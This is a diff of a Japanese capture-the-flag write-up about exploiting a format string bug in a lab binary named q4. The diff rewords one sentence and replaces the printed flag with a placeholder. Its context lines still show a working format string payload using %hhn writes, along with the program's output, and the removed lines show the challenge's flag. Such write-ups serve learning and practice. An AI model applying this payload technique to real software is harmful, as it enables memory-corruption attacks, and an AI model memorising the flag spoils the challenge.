@@ -49,7 +49,7 @@ no
 I see. Good bye.
 ```
 
-全くもって聞く耳をもたないので，ブチギレながら調査してみる．名前をオウム返ししているあたりFormat string attackが有効かも？
+全くもって聞く耳をもたないので，ブチギレながら文字列を調査してみる．名前をオウム返ししているあたりFormat string attackが有効かも？
 
 ```
 [q4@localhost ~]$ strings q4
@@ -303,10 +303,5 @@ b'\xe0\x99\x04\x08\xe1\x99\x04\x08\xe2\x99\x04\x08\xe3\x99\x04\x08%129x%6$hhn%24
 [q4@localhost ~]$ echo -e '\xe0\x99\x04\x08\xe1\x99\x04\x08\xe2\x99\x04\x08\xe3\x99\x04\x08%129x%6$hhn%245x%7$hhn%126x%8$hhn%4x%9$hhn' | ./q4
 What's your name?
 Hi, �                                                                                                                              400                                                                                                                                                                                                                                               2bb8c0                                                                                                                             8  14
-FLAG_nwW6eP503Q3QI0zw
-```
-
-#### Flag
-```
-FLAG_nwW6eP503Q3QI0zw
+FLAG_- 省略 -
 ```
